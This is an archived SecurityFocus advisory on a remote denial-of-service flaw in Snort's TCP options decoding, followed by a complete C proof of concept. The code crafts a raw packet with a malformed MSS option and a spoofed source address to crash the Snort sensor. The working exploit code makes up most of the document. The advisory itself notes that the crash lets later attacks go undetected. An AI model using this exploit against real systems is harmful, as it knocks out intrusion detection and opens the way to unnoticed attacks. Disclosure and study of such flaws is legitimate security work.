source: http://www.securityfocus.com/bid/12084/info

Snort is reported prone to a remote denial of service vulnerability. The vulnerability is reported to exist in the DecodeTCPOptions() function of 'decode.c', and is as a result of a failure to sufficiently handle malicious TCP packets.

A remote attacker may trigger this vulnerability to crash a remote Snort server and in doing so may prevent subsequent malicious attacks from being detected. 

/*
* snort >= 2.1.3 TCP/IP options bug proof of concept
* by Marcin Zgorecki
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define DADDR	"127.0.0.1"

int main(int argc, char **argv)
{
int s;
/* TCP MSS option, should be: "\x02\04\xff\xff" */
char opts[] = "\x02\x00\xff\xff";
char datagram[64];
struct sockaddr_in addr;
struct ip *ip = (struct ip *) datagram;
struct tcphdr *tcp;

memset(&datagram, 0, sizeof(datagram));
addr.sin_addr.s_addr = inet_addr(DADDR);
addr.sin_port = htons(123);
addr.sin_family = AF_INET;

ip->ip_hl = 5;
ip->ip_v = 4;
ip->ip_tos = 0;
ip->ip_id = 0;
ip->ip_off = 0;
ip->ip_ttl = 64;
ip->ip_p = IPPROTO_TCP;
ip->ip_len = 44;
ip->ip_sum = 0;
ip->ip_dst.s_addr = addr.sin_addr.s_addr;
ip->ip_src.s_addr = inet_addr("1.2.3.4");

tcp = (struct tcphdr *) (datagram + (ip->ip_hl << 2));
tcp->source = htons(321);
tcp->dest = addr.sin_port;
tcp->seq = 0;
tcp->ack = 0;
tcp->res1 = 0;
tcp->doff = 6;
tcp->syn = 0;
tcp->window = 0x1000;
tcp->check = 0;
tcp->urg_ptr = 0;

memcpy(datagram + 40, opts, sizeof(opts));

if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
perror("socket");
exit(0);
}

if (sendto(s, datagram, ip->ip_len, 0, (struct sockaddr *) &addr,
sizeof(struct sockaddr_in)) == -1) {
perror("sendto");
exit(-1);
}

printf("packet sent!\n");

close(s);
return 0;

}
